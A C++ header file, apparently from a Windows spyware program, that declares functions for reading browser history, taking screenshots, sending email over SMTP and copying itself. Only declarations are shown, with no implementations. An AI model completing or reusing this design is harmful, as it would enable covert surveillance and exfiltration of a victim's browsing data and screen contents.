#pragma once
#include "BrowsHistory.h"
#include <iostream>
#include <fstream>
#include <cstring>
#include <vector>  
#include "CSmtp.h"
#include <vector>  
#include "afxwin.h"  
#include <direct.h>
#include <d3d9.h>
#include <Wincodec.h>             // we use WIC for saving images
#pragma comment(lib, "d3d9.lib")  // link to DirectX 9 library
using namespace std;

using namespace std;
void getHistory();
void sendemail();
void copy();
void copyitself(const char *s);
int ScreenCapture(const char* fname);
